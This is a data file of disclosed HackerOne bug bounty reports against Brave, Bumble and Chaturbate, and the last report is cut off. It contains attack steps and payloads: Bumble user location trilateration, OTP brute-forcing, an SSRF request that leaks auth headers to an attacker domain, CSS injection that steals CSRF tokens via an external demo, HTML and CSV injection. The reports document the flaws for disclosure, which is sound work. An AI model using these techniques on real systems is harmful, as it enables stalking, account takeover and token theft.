Brave Software,101-250,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Homograph attack,"jaypatel  submitted a report to Brave Software.Oct 12th (6 years ago)Summary:
when we add a site to our Homepage, it's not validate a url properly, make sure it's display the punycode.
Products affected:

Brave 0.12.4 (Tested on mac os)

Steps To Reproduce:

In browser add homepage with IDN  http://ebаy.com/
now close and open browser again
you can see it's redirect to http://xn--eby-7cd.com/

References:

https://hackerone.com/reports/29491",https://hackerone.com/reports/175286,California,United States,San Francisco,2016,10,12,4,25
Brave Software,101-250,0.0,10m-50m,$300.00,Low,3.8,None,Navigation to `chrome-extension://` origin (internal pages) from the web,"metnew  submitted a report to Brave Software.Jul 7th (4 years ago)Summary
http and https pages are disallowed from navigating to chrome-extension:// origin.  However, ftp protocol isn't checked. Pages from ftp:/// and file:/// origin could navigate to chrome-extension:// origin.
Steps to reproduce:

Start ftp server (sample ftp server attached, npm i ftpd && node ftp-server.js
Open ftp://localhost:7002/exploit.html
Click ""Go to payment settings""
about:preferences#payments page opens (window.open)

Products affected
Brave: 0.23.31
V8: 6.7.288.46
rev: 3148acef36dba0fce89108638bb27927c4937f90
Muon: 7.1.5
OS Release: 17.6.0
Update Channel: Release
OS Architecture: x64
OS Platform: macOS
Node.js: 7.9.0
Brave Sync: v1.4.2
libchromiumcontent: 67.0.3396.103
Impact
Navigation to chrome-extension:// should be forbidden, because it's a bad behavior which creates additional attack vectors.
If some component(e.g., html file) inside an extension's folder is vulnerable to reflected XSS, then it's possible to navigate to this component from the web and execute arbitrary code in the context of this extension.2 attachments:F316812: ftp-server.jsF316813: exploit.html",https://hackerone.com/reports/378805,California,United States,San Francisco,2018,7,7,10,58
Brave Software,101-250,0.0,10m-50m,$50.00,Low,2.0,Violation of Secure Design Principles,Lack of quarantine meta-attribute for downloaded files leads to GateKeeper bypass,"metnew  submitted a report to Brave Software.Jun 30th (4 years ago)Summary:
Executable files downloaded through Brave don't have quarantine attribute.
That means it's possible to launch any executable bypassing codesigning + quarantine.
However, later I found that Brave has already tracked similar report but only in the context of .pkg files. 
Additionally, Brave is allowed to run apps in Terminal. It was already shown in 369185 that Brave has more permissions on Terminal than it should have => It is possible to execute downloaded files in Terminal by click(double click) in Brave ""Downloads"" toolbar.
macOS doesn't have executable files that could be launched without installation after downloading from the web. Files like .command and .tool could be executed in Terminal and only if they have -x, but these files downloaded from the web have only -rw.
However, it's possible to download and launch Java archives, because they're archives => executable after downloading.

As far as I know, Java isn't installed by default. That means only macOS users with Java installed are affected by this problem.

Products affected:
Brave: 0.23.19
V8: 6.7.288.46
rev: 178c3fbc045a0cbdbe098db08307503cce952081
Muon: 7.1.3
OS Release: 17.6.0
Update Channel: Release
OS Architecture: x64
OS Platform: macOS
Node.js: 7.9.0
Tor: 0.3.3.7 (git-035a35178c92da94)
Brave Sync: v1.4.2
libchromiumcontent: 67.0.3396.87
Steps To Reproduce:
Chrome/<etc>
Apps from unknown publishers disallowed (screencast):
Download test.jar using Chrome -> launch it from Downloads toolbar -> macOS warns that this executable published by an unknown developer -> manually allow running the app from Settings-> app launches.
Apps from anywhere allowed:
Download test.jar using Chrome -> launch it from Downloads toolbar -> macOS warns that this Java archive was downloaded from the web  -> allow -> app launches.
Apps from anywhere + downloaded executables allowed:
Download test.jar using Chrome -> launch it from Downloads toolbar -> macOS warns that Chrome can't run files in Terminal.
Brave (unknown publishers disallowed, screencast)
Download test.jar using Brave -> launch it from Downloads toolbar (double click) -> no warnings, Java archive launches.
Supporting Material/References:
Live PoC + jar + screencast
Impact

Java isn't installed on macOS by default (as I know), that's why it's not critical.

Users with installed Java could run any downloaded through Brave java archive from Downloads toolbar bypassing quarantine + code-signing checks in one click (double click).
I think this isn't a duplicate, because this attack scenario leverages two vulnerabilities (quarantine + Brave permissions over Terminal).

The fact that downloaded files aren't in quarantine by itself doesn't show that it's possible to execute any app by click. However, Brave's permissions over Terminal introduce that.
3 attachments:F313860: exploit.htmlF313861: brave-jar.mp4F313862: hello.jar",https://hackerone.com/reports/374106,California,United States,San Francisco,2018,6,30,1,4
Brave Software,101-250,0.0,10m-50m,$50.00,Medium,5.45,Command Injection - Generic,[website] Script injection in newsletter signup https://brave.com/brave_youth_program_signup.html,"cmd-0_0  submitted a report to Brave Software.Oct 12th (6 years ago)go to https://brave.com/brave_youth_program_signup.html
click become an ambasador
insert malicious payloads in the fields <a href='evil,com'>YOU JUST WON 1m$ </a>
you will receive a mail like in the image attached.
You can send phising emails and do other bad stuff.
If you need more details i'm here.1 attachment:F127444: htmlinj.png",https://hackerone.com/reports/175403,California,United States,San Francisco,2016,10,12,15,9
Brave Software,101-250,0.0,10m-50m,$50.00,Low,3.1,None,Unsafe handling of protocol handlers,"metnew  submitted a report to Brave Software.Jun 20th (4 years ago)Summary:
Brave browser (macOS) handles protocol handlers in unsafe way (and differently from other browsers).
Key differences between protocol handlers handling in Brave and other browsers:
Open external app vs Open ""Terminal""
Brave only asks about opening external app.
Other browsers (e.g. Chrome) asks about opening a specific app. 
Try to open a ssh:// link in Chrome: browser opens a popup with a question similar to ""Do you want to open ""Terminal""?"" 
Opening ssh:// in Brave results in a popup with a content similar to : ""Do you want to open external app for ssh://""

Sorry, I didn't remember actual popups' content + I've got RU version

Impact
User doesn't know which app will be opened after allowing to open an external app.
That means it easier for attacker to trick user to open an external app in Brave compared to other browsers.
This applies to all protocol handlers in Brave browser, not only ssh:// or telnet://.
ssh:// and telnet:// without confirmation
In Chrome/Safari/FF, after opening Terminal using ssh:// link, Terminal shows an alert with a text similar to ""Do you want to initiate ssh session with *example.com?"".
Next things worth noting:

There is an additional confirmation dialog in Terminal while navigating to ssh:// through browser.
Default answer in the confirmation dialog is negative. (""Don't connect"")
example.com: user sees exact host

Brave browser initiates ssh:// and telnet:// sessions automatically after opening the external app (Terminal) without confirmation messages.
If browser handles ssh:// URLs  by default, any iframe with src=""ssh://example.com"" could automatically start ssh session without user's interaction.  Additionally, it's possible to silently initiate ssh connection, by running alert() on window.onblur event - Terminal isn't visible in this case.
Same applies to telnet:// too.
Version:
Brave	0.22.810
V8	6.7.288.43
rev	8f30eeb
Muon	7.0.6
OS Release	17.6.0
Update Channel	Release
OS Architecture	x64
OS Platform	macOS
Node.js	7.9.0
Brave Sync	v1.4.2
libchromiumcontent	67.0.3396.71
Steps To Reproduce:


Open exploit.html


Click ssh://google.com link


Allow opening an external app


Terminal launched without additional alerts/warnings


Open exploit.html


Click ssh://google.com link


Remember ssh:// (set as default handler)


Add iframe <-- Any iframe could automatically trigger ssh connection without confirmation


Impact


No confirmation message for external apps. - definitely bad behavior. Brave handles all protocol handlers in this way, not only ssh:// || telnet://


SSH connection without confirmation - ssh sessions leak important user info: IP, username, etc. Also, it opens a wider attack surface.


If ssh:// is allowed to open by default (i.e. ""remembered""): Any iframe could automatically trigger ssh session. It's possible to start ssh session without user's notice by calling alert() after navigation to ssh://


Terminal doesn't alert hostname in confirmation dialog (because of no confirmation dialog), so it's possible to spoof host to which user connects. 


Example/Attack scenario for #4:

link points to ssh://abc.xyz and the text of the link is ""Connect to google.com"". 
User clicks and initiates connection to abc.xyz. 
In most cases host will be visible in terminal tab's header. However, because ssh command isn't printed in terminal output while navigating through ssh:// URLs, it's ease to not notice real host name and continue treat it as google.com.
1 attachment:F310762: exploit.html",https://hackerone.com/reports/369185,California,United States,San Francisco,2018,6,20,14,9
Bumble,1001-5000,0.0,10m-50m,"$1,000.00",No value,0.0,Violation of Secure Design Principles,Bruteforce password recovery code,"0x3c3e  submitted a report to Bumble.Nov 21st (3 years ago)Summary
It's possible to bruteforce recovery code from SMS as iOS application doesn't have limits for incorrect inputs. I have tried 50+ different combinations until I reached code from SMS.
Steps To Reproduce

Click ""Use another option"" on application startup view
Enter your phone number
Click ""Forgotten number""
Click ""OK"" on pop-up window
Bruteforce 4 digits code 

PoC video
https://youtu.be/QV80pD0wZsE
Mitigation

Limit quantity of attempts to enter recovery code
Don't store recovery code on target device to compare it with user's input

Details
Devices: Iphone SE (13.2), Iphone 6s (12.4)
App: Bumble (5.140.0)
Impact
Account takeover.",https://hackerone.com/reports/743545,Texas,United States,Austin,2019,11,21,17,54
Bumble,1001-5000,0.0,10m-50m,$600.00,Medium,5.3,Information Disclosure,Bumble API exposes read status of chat messages,"ndrong  submitted a report to Bumble.Jan 17th (2 years ago)Summary
The Bumble app allows matches to chat with each other. In the mobile apps it is possible to see whether a message has been delivered (the webapp does not offer this feature), but the read status of messages is never disclosed. However, by issuing a POST request to the API endpoint at https://am1.bumble.com/mwebapi.phtml?SERVER_OPEN_CHAT, it is possible for users to retrieve the read status of individual message within all their chats.
Steps to reproduce

Log in to the webapp at https://bumble.com.
Use an intercepting proxy (e.g. Burp Suite) to record traffic between the client and the server.
Open an existing chat.
Looking at the traffic log, notice an outgoing POST request to https://am1.bumble.com/mwebapi.phtml?SERVER_OPEN_CHAT, retrieving the chat messages from the backend.
Observe the response to the aforementioned request: it contains an array of chat_messages, where each badoo.bma.ChatMessage contains a boolean key read, displaying the read status of the message.

Screenshots
Chat A as shown in the iOS app  (""bezorgd"" is Dutch for ""delivered"")
{F1161099}
Chat B as shown in the iOS app  (""bezorgd"" is Dutch for ""delivered"")
{F1161098}
Request (and response) for chat A, showing that it has not been read by the other user
{F1161096}
Request (and response) for chat B, showing that it has been read by the other user
{F1161097}
Impact
The Bumble app implies that the read status of messages is not shared with others, due to the fact that it shows a ""delivered"" status below messages, while never showing a read status. Due to the information disclosure in the aforementioned API endpoint, users may view the read status of all messages within their chats, potentially violating the privacy of the user on the other end (who most likely expects this information to be kept private).Summary by ndrongThe Bumble app allows matches to chat with each other. In the mobile apps it is possible to see whether a message has been delivered (the webapp does not offer this feature), but the read status of messages is never disclosed. However, by issuing a POST request to an API endpoint, it was possible for users to retrieve the read status of individual messages within all of their chats. Bumble has resolved this issue by always returning a read status of false, regardless of the actual read status of a message.",https://hackerone.com/reports/1080437,Texas,United States,Austin,2021,1,17,18,39
Bumble,1001-5000,0.0,10m-50m,"$2,000.00",High,7.95,Information Disclosure,Exfiltrating a victim's exact location (to within 5m),"robertheaton  submitted a report to Bumble.Jun 15th (about 1 year ago)I used Bumble's distance feature to exfiltrate the exact location (to within approx 5m) of a victim. I did this by using the Bumble API to move my attacker account's location around the approximate area of the victim. I was able to obtain the exact distance between attacker and victim at 3 separate locations, and I then used trilateration (https://gis.stackexchange.com/questions/17344/differences-between-triangulation-and-trilateration) to combine these 3 distances into a single, precise location.
This is not a new vulnerability; Tinder was found to be vulnerable to a version of it in 2014 (https://blog.includesecurity.com/2014/02/how-i-was-able-to-track-the-location-of-any-tinder-user/). What is new is the circumvention of Bumble's attempted mitigations for the Tinder attack. Tinder was trivially vulnerable to trilateration because their API returned the exact distance between attacker and victim, to 15 decimal places, and the client was responsible for rounding it. Bumble attempts to mitigate this by rounding the distance on the server, and returning only this rounded distance to the client. Simple trilateration is still possible using these rounded values, but this only gives us an accuracy of the nearest square mile or so.
However, we can massively increase the precision to the nearest few metres by hypothesising that Bumble performs server-side rounding using code like the following:
Code 153 BytesWrap lines Copy Download1def calculate_rounded_distance():
2  exact_distance = calculate_exact_distance()
3  rounded_distance = math.floor(exact_distance)
4  return rounded_distance
This means that we can have our attacker slowly ""shuffle"" around the vicinity of the victim, looking for the precise location where a victim's distance from us flips from (say) 1.0 miles to 2.0 miles. We can infer that this is the point at which the victim is exactly 1.0 miles from the attacker. We can find 3 such ""flipping points"" (to within arbitrary precision, say 0.001 miles), and use them to perform trilateration as before.
To reproduce:

Create 2 accounts - a victim and an attacker. I don't believe that they need to be made to match with each other in order to exploit this vulnerability.
Use Burp Suite or similar to grab the victim and attacker session IDs so that we can control them programatically via the Bumble API
Use the Bumble API to put the victim in a fixed, target location
Put the attacker in a random location in the vicinity of the victim. The attack does not require any special knowledge of the victim's location beyond the summary shown in the UI (eg. ""Lambeth"")
Step the attacker in a random direction in small increments (smaller increments take longer but give more precise locations). After each step, check the distance between attacker and victim. If it has changed, record the average of the current and previous location as being exactly the smaller of the 2 distances away from the victim.
If desired, repeat step 5 with a smaller step size in the vicinity of the known distance flip in order to increase precision
Repeat steps 4-6 3 times starting in different positions
Draw 3 circles, 1 for each distance found. The radius should be the distance between victim and attacker, the centre should be the point at which the distance flipped. (KML viewed in Google Earth is convenient for this step)
Confirm that all 3 circles cross at the same point - you should have been able to identify the victim's location to within approx 5m

I've included a Python POC with this report, and a screenshot of trilateration results produced using this script where the victim is placed at 10 Downing Street, UK. Depending on precision desired it takes approximately 10 seconds to find a victim's location.
Impact
The Bumble API does not appear to restrict the users about whom an attacker can pull information. This means that an attacker could use this vulnerability to find the exact location of any user whose user ID they know. This includes:

Current matches
Past matches who have since broken up with them
Any user whose profile the attacker has been shown in an encounter

The only restriction I've found is that sometimes the API does not return the numerical distance between the attacker and victim. I speculate that this occurs when the victim hasn't checked in for a period of time.
To mass exfiltrate the locations of a large swathe of Bumble users, an attacker could use multiple accounts with wide filters to cycle through large numbers of encounters, collecting large numbers of user IDs and then using trilateration to find all of their locations.
Revealing the exact location of Bumble users presents a grave danger to their safety, so I have filed this report with a severity of ""High"".",https://hackerone.com/reports/1234406,Texas,United States,Austin,2021,6,15,8,44
Bumble,1001-5000,0.0,10m-50m,$400.00,High,8.1,Violation of Secure Design Principles,"On Singing up with a Phone number , The 4 digit OTP does not expires for a long time leading to an easy attack and make a verified account easilty","squirreldeep  submitted a report to Bumble.Feb 10th (3 years ago)Hello there how are you doing ?
Go to sign up page and enter a new phone number and you will be redirected to https://bumble.com/registration/confirm-phone .
You will receive a easy breakable 4 digit OTP Code .
I waited for about 4 hours and the OTP did not expired , This shows that the OTP can be easily bruteforced even having the rate limiting , assuming rate limiting is implemented as this is an old program .
The OTP can be bruteforced , by changing IP via VPN and as the OTP does not expires for a long time it gives sufficient time , to get the actual OTP Code also the OTP is only of 4 digits , So it only requires 10,000 requests .
For Solving of this issue , Captcha Implementation is recommended .
POC - Please check screenshots
Impact
Impact
Registering with a different person mobile number without actual verification .
Impersonating other's identity .",https://hackerone.com/reports/792295,Texas,United States,Austin,2020,2,10,18,35
Bumble,1001-5000,0.0,10m-50m,$140.00,Low,2.0,Violation of Secure Design Principles,Email Spoofing,"proabiral  submitted a report to Bumble.Nov 16th (6 years ago)There is an Email Spoofing Vulnerability.
Steps to reproduce:
1) Go to http://emkei.cz/
2) Fill ""From Email"" field to admin@badoo.com or any other badoo email.
3) Fill the victim's address (your address) to ""TO"" field and fill in other details as you wish.
You will receive email from badoo admin.
Reference:
https://hackerone.com/reports/575
Thank you for time and consideration you provided for reading my report.
Note: If you don't find it in your inbox, see spam folder. If the victim is using Gmail account it might be in spam folder. In other mailing service like yahoo it is directly recieved in inbox.
Your sincerely,
Abiral Shrestha",https://hackerone.com/reports/182467,Texas,United States,Austin,2016,11,16,8,28
Chaturbate,11-50,0.0,1m-10m,$300.00,Medium,4.3,None,[chaturbate.com] - CSRF Vulnerability on image upload,"corb3nik  submitted a report to Chaturbate.Aug 28th (4 years ago)Summary##
Hi guys,
One of the features available to a Chaturbate user is the ability to upload images into photo sets. The upload functionality does not use any CSRF tokens, allowing attackers to perform CSRF attacks and upload images to a user's profile without the user's consent.
Steps To Reproduce:

Login to Chaturbate.
Browse to your profile page and upload an image.
Note the set ID of the newly created set (this is available by visiting set in the profile page. It'll be in the URL : https://chaturbate.com/photo_videos/photoset/detail/[username]/[set_id]/).
Download the poc.html file attached to this report.
Edit poc.html by replacing the number 4771110 by the set ID found at step #3.
Open poc.html and click on Submit request.
Visit your Chaturbate image set.

You'll notice that the photo set now inludes an additional image (a blank/white image).
Impact
In order for this attack to work, an attacker would need to know the correct photo set ID. Since set IDs are public information, this isn't an issue.
I've set the impact here to medium since this affects the integrity of user accounts.1 attachment:F338757: csrf_poc.html",https://hackerone.com/reports/401483,California,United States,Irvine,2018,8,28,4,50
Chaturbate,11-50,0.0,1m-10m,$350.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,[chatws25.stream.highwebmedia.com] - Reflected XSS in c parameter,"kazan71p  submitted a report to Chaturbate.Sep 24th (4 years ago)Hi Team,
Found that chatws25.stream.highwebmedia.com is vulnerable to reflected XSS in c parameter, we can verify it with following URL, it is also a Cloudflare filter bypass:
https://chatws25.stream.highwebmedia.com/ws/007/tgpraolp/htmlfile?c=███
Code 75 BytesWrap lines Copy Download1https://chatws25.stream.highwebmedia.com/ws/007/tgpraolp/htmlfile?c=███████
Image F350412: Screenshot_at_Sep_25_01-29-41.png 26.32 KiBZoom in Zoom out Copy Download
Impact
One of the most common XSS attack vectors is to hijack legitimate user accounts by stealing their session cookies.1 attachment:F350412: Screenshot_at_Sep_25_01-29-41.png",https://hackerone.com/reports/413442,California,United States,Irvine,2018,9,24,16,31
Chaturbate,11-50,0.0,1m-10m,"$8,000.00",Critical,9.1,Improper Authorization,Account Takeover via billing,jolteon  submitted a report to Chaturbate.Aug 13th (4 years ago),https://hackerone.com/reports/394329,California,United States,Irvine,2018,8,13,21,11
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Improper Input Validation,Add non-existent room moderator,"popeax  submitted a report to Chaturbate.Jul 22nd (4 years ago)Description
A broadcaster can add or remove a non-existent user as a moderator.  This is submitted using the testbed as it wasn't possible to initiate a broadcast on the production site.  
Steps

As a broadcaster add a moderator to the broadcast (attachment 1).
Observe the request sent to the server (attachment 2).
Replay the request from step 2.  Change the second to last part of the URL to a non-existent user (attachment 3).
Observe the server broadcasts the operation to the room  (attachment 4).

Impact
It is unclear what side effects, if any, this could have.  This is really being reported because the application had very strict access controls and this seems to one of the only places it was obvious the access controls and input validation weren't as strict as they could be.4 attachments:F323415: moderator_2.pngF323416: moderator_1.pngF323417: moderator_3.pngF323418: moderator_4.pngwilliammmllc Chaturbate staff  updated the severity from medium (4.3) to none. Jul 22nd (4 years ago)williammmllc Chaturbate staff  updated the severity from none to low. Jul 22nd (4 years ago)williammmllc Chaturbate staff  changed the status to Triaged. Jul 23rd (4 years ago)Chaturbate  rewarded popeax with a $100 bounty. Jul 23rd (4 years ago)Thanks for your report. There are no adverse effects to this, but it is missing full input validation so we do consider this a bug.williammmllc Chaturbate staff  closed the report and changed the status to Resolved. Jul 23rd (4 years ago)This is now resolved. Thanks again for your report!williammmllc Chaturbate staff  requested to disclose this report. Sep 19th (4 years ago)  This report has been disclosed. Oct 19th (4 years ago)",https://hackerone.com/reports/385239,California,United States,Irvine,2018,7,22,20,48
Chaturbate,11-50,0.0,1m-10m,"$1,250.00",High,7.95,Server-Side Request Forgery (SSRF),Blind SSRF at https://chaturbate.com/notifications/update_push/,"robin0oklay  submitted a report to Chaturbate.Sep 20th (4 years ago)In the application at https://chaturbate.com/notifications/update_push/ there is a functionality to subscribe any cam model which will trigger the provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server
Steps to Replicate the submission:-
Login to your https://chaturbate.com/ account or use my account-
USERNAME-██████████
PASSWORD-███████
Now click on profile, or trigger any request so that you can get your Cookie / CSRF token.
Send any request to repeater and replace it with the provided request
POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: /
Accept-Language: en-US,en;q=0.5
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: YOURCSRFHERE
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE
Connection: close
subscription={""endpoint"":""http:\/\/███\/wpush\/v2\/████&unsub=false
As you can see that I have changed the actual URL to my domain ████████, so that I can get the actual request send to the server.
Put your cookie and CSRF token (you can copy CSRF token from your cookies) over here and than send this request
Go to this URL to confirm SSRF at - http://████████████
you will find that your Crypto-Key, Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.
These headers are very sensitive to be leaked and hence needs to be fixed as soon as possible.
Note
The application do not require to send the URL along with the domain, it is secure to only send the Rest part of the URL and do not include the domain so that the attacker could not control the complete request.
Thanks
Regards
Robin Ooklay
Impact
Using this Request an attacker can execute SSRF attack and also steal sensitive Token / Keys of the internal web server.",https://hackerone.com/reports/411865,California,United States,Irvine,2018,9,20,17,4
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Time-of-check Time-of-use (TOCTOU) Race Condition,Bypass subdomain limits using race condition,encrypt  submitted a report to Chaturbate.Aug 15th (4 years ago),https://hackerone.com/reports/395351,California,United States,Irvine,2018,8,15,6,59
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Business Logic Errors,"Chaturbate ""/chat_ignore_list/"" endpoint does not check for Account status: Disabled  before adding Ignore via POST","nismo  submitted a report to Chaturbate.Sep 27th (4 years ago)Summary##
Chaturbate.com provides the ability for its users when in chat to ignore other users in chat rooms via DM etc by adding their camhandle name  to ignore_list via HUI
Actually this is just a POST to  /chat_ignore_list/ getting as a parameter the username which is the camhandle name in order to add the user to the ignore_list
The same can endpoint is used to unignore the username, by adding the boolen remove parameter set as true remove=1
Although the endpoint checks for the availability of the account to be ingoned or unignored, the  endpoint does not check for status: Disabled Accounts before the POST method, as all the endpoints in Chaturbate do.
Also as said on Hint,  this can be used to add and username even if not participating at Chaturbate room at the time or being online
Steps To Reproduce:


Create an account and disable it (in this POC the disabled airbornh3 was used as a demo) 


Make a POST to /chat_ignore_list/ endpoint as


Code 42 BytesWrap lines Copy Download1username=airbornh3&csrfmiddlewaretoken=XXX
Image F352078: ignore.png 148.19 KiBZoom in Zoom out Copy Download

To verify this is actually happening make a call via GET to /api/ignored_user_list/

Image F352077: checklist.png 144.41 KiBZoom in Zoom out Copy Download

Make a POST to /chat_ignore_list/ endpoint as

Code 51 BytesWrap lines Copy Download1username=airbornh3&remove=1&csrfmiddlewaretoken=XXX
Image F352076: unignore.png 147.39 KiBZoom in Zoom out Copy Download
You can also verify that the user was unignored via a GET method to /api/ignored_user_list/ as shown above
Hint (..get me that POST command in GUI :) )
You can use Burp or any HTTP interceptor to grab and replay an ignore command while inside a chatroom to get the POST command as well. Then you can use it to POST and ignore any user even if he is not connected to any room or not Online at all 
Solution
While checking the account availability you should also check account status Disabled as well as doing on all other endpoints as well
Thanks and keep up the great work
@nismo
Impact
Misconfiguration, Inappropriate check in endpoint usage3 attachments:F352076: unignore.pngF352077: checklist.pngF352078: ignore.pngwilliammmllc Chaturbate staff  updated the severity to low. Sep 27th (4 years ago)williammmllc Chaturbate staff  added weakness ""Business Logic Errors"". Sep 27th (4 years ago)williammmllc Chaturbate staff  changed the status to Triaged. Sep 27th (4 years ago)Thanks for the report, this is a low security issue, but we will fix.Chaturbate  rewarded nismo with a $100 bounty. Sep 27th (4 years ago)williammmllc Chaturbate staff  closed the report and changed the status to Resolved. Sep 29th (4 years ago)This should be resolved now, can you confirm? Thanks again for your report!
    
    
        
            
                
                
                
            
        
    
nismo   posted a comment. Sep 29th (4 years ago)Hi @williammmllc 
Amazingly fast fix! Just checked and I can confirm it is fixed!
Excellent!! Congrats
@nismowilliammmllc Chaturbate staff  requested to disclose this report. Oct 1st (4 years ago)  This report has been disclosed. Oct 31st (4 years ago)",https://hackerone.com/reports/415398,California,United States,Irvine,2018,9,27,19,12
Chaturbate,11-50,0.0,1m-10m,$150.00,Low,3.1,Cross-Site Request Forgery (CSRF),"CSRF in ""send them an email and browser notification"" feature",encrypt  submitted a report to Chaturbate.Aug 18th (4 years ago),https://hackerone.com/reports/396802,California,United States,Irvine,2018,8,18,12,53
Chaturbate,11-50,0.0,1m-10m,$300.00,Medium,4.3,Cross-Site Request Forgery (CSRF),CSRF in cancel group and private show requests,"encrypt  submitted a report to Chaturbate.Aug 17th (4 years ago)Summary by encryptI have found a CSRF vulnerability in chat room. When users cancel group shows for any chat room, a POST request is made to the server on this endpoint /tipping/group_show_cancel/broadcaster's_username/ and this request is CSRF protected. This CSRF protection can be bypassed by making a GET request to above endpoint and group show request will be cancelled.",https://hackerone.com/reports/396338,California,United States,Irvine,2018,8,17,3,34
Chaturbate,11-50,0.0,1m-10m,$250.00,Low,2.0,Cross-Site Request Forgery (CSRF),CSRF in REPORT EMOTICON feature,encrypt  submitted a report to Chaturbate.Aug 16th (4 years ago)Summary by encryptUsers can report to emoticons on the the basis of the expressions but the request made to https://chaturbate.com/emoticon_report_abuse/emoticon_name was a GET request which was not protected by CSRF header.,https://hackerone.com/reports/395731,California,United States,Irvine,2018,8,16,4,38
Chaturbate,11-50,0.0,1m-10m,$100.00,Low,2.0,Cross-Site Request Forgery (CSRF),CSRF on change video thumbnail at https://chaturbate.com,"avinash_  submitted a report to Chaturbate.Oct 1st (4 years ago)Hi
I noticed Changing video thumbnail option have the workflow with GET request and there is lack of csrf token on changing video thumbnail option,so if attacker somehow able to obtain the thumbnail_id of victim's video then it can help attacker to inducing victim to change video thumbnail.
Vulnerable Request:
GET /photo_videos/video/thumbnail/video_id/?thumb=thumbnail_id HTTP/1.1
Host: chaturbate.com
Steps to reproduce:
setup:-
Video A :- an  uploaded video on victim's account.
video_id :- id of video A from victim's account
thumbnail_id :- id of any thumbnail from video A.

Configure the upper setup along with this url https://chaturbate.com/photo_videos/video/thumbnail/video_id/?thumb=thumbnail_id
Feed the configured url to victim(as setup in step 1)
Wait 5-9 minutes.
Open your bio tab.
Check, the video thumbnail will successfully get changed.

With Best Regards
Impact
Attacker can induce victim to change video's thumbnail.",https://hackerone.com/reports/416682,California,United States,Irvine,2018,10,1,6,42
Chaturbate,11-50,0.0,1m-10m,$333.00,High,7.95,Cross-site Scripting (XSS) - DOM,CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS ,"nahamsec  submitted a report to Chaturbate.Jul 24th (4 years ago)Hi there,
There's a CSS injection here: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX 
Code 181 BytesWrap lines Copy Download1  body, div#main, div.content, div.block, div.section {margin: 0px; padding: 0px;}
2  body {min-width:800px;}
3  div.content {width: 100%;}
4  
5  body {background: }*{background:red;}
6
This allows an attacker to enumerate the CSRF token. Once the CSRF token is enumerated, we can 
POC

Go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset
Now go to http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR and let it do it's magic :) 

Image F324052: cssi.gif 35.87 MiBZoom in Zoom out Copy Download
There are numerous endpoints like POST /choose_broadcaster_chat_color where it returns Content-Type: text/html; charset=utf-8 that could potentially allow a hacker to combine the two for XSS (I haven't gotten that far yet)
 Do you mind asking your HackerOne contact to allow collaboration on your program, so I can invite another researcher that helped me exploit this fully?
Thanks,
Ben
Impact
1 attachment:F324052: cssi.gifthefrog   changed the status to Triaged. Jul 24th (4 years ago)Hi Ben,
Thank you for your submission and please let me know who you would like to invite to this report. I was able to validate your report, and have submitted it to the appropriate team for a thorough evaluation. The report will be reviewed to assess the full impact, after which a final ruling will be made. Please note that the status and severity of this report are subject to change.
Best regards,
@thefrog
Security Analyst
HackerOne
    
    
        
            
                
                
                
            
        
    
nahamsec   posted a comment. Jul 24th (4 years ago)@thefrog - You aren't able to invite a collaborator, only an external member. Collaborator allows hackers to split the bounty on platform, as external members are only able to comment/view. nahamsec   invited another hacker as a collaborator. Jul 24th (4 years ago)nahamsec   invited another hacker as a collaborator. Jul 24th (4 years ago)ziot   joined this report as a collaborator. Jul 24th (4 years ago)d0nut   joined this report as a collaborator. Jul 24th (4 years ago)Chaturbate  rewarded d0nut with a $333 bounty. Jul 25th (4 years ago)Thanks for the report, we'll get this fixed.Chaturbate  rewarded ziot with a $333 bounty. Jul 25th (4 years ago)Thanks for the report, we'll get this fixed.Chaturbate  rewarded nahamsec with a $333 bounty. Jul 25th (4 years ago)Thanks for the report, we'll get this fixed.williammmllc Chaturbate staff  closed the report and changed the status to Resolved. Jul 25th (4 years ago)This is resolved. Thanks again for the report!williammmllc Chaturbate staff  requested to disclose this report. Sep 19th (4 years ago)nahamsec   agreed to disclose this report. Sep 19th (4 years ago)  This report has been disclosed. Sep 19th (4 years ago)",https://hackerone.com/reports/386334,California,United States,Irvine,2018,7,24,18,2
Chaturbate,11-50,0.0,1m-10m,$150.00,Low,3.1,OS Command Injection,CSV Injection with the CSV export feature,"caffeinefix  submitted a report to Chaturbate.Jul 24th (4 years ago)Hi there,
hope you are well,
The ""Download as a CSV"" feature of ``` does not properly ""escape"" fields. So that particular field is vulnerable to CSV injection.
Steps of POC
Step 1 : Go to any chat room and donate any token to some and in note insert =4+4.
Step 2 : Now go to on this link and download transaction history.
Step 3 : Download file as CSV and open it you can =4+4 become 8 so it's prove CSV injection.
POC video
███
Malicious user can take big advantage of this vulnerability because from that vulnerability we can run base OS command on any anonymous user account.
Prevention
Strip ""="" only, it's not foolproof fix, see this report #72785 you have to strip +/-/@ and | as well.
Reference,
https://hackerone.com/reports/72785
https://hackerone.com/reports/223344
https://hackerone.com/reports/244292
Please let me know if you want more information regarding this report.
Cheers,
Ninjan
Impact
This vulnerability can be harm for normal user because if malicious user injected any malicious script in token note and when customer user download CSV file then inserted command directly runs when CSV file open.",https://hackerone.com/reports/386116,California,United States,Irvine,2018,7,24,6,11
Chaturbate,11-50,0.0,1m-10m,$400.00,Medium,5.45,Improper Authorization,Forget password link not expiring after email change.,"imran_nisar  submitted a report to Chaturbate.Sep 19th (4 years ago)I found a token miss configuration flaw in chaturbate.com, When we reset password for a user a link is sent to the registered email address but incase it remain unused and email is updated by user from setting panel then too that old token [reset link] sent at old email address remains valid.
A better explanation
1- User use reset feature to get reset link [Email : etc@x.com]
2- User came to know about his old password so remain the link unused and the token not expires
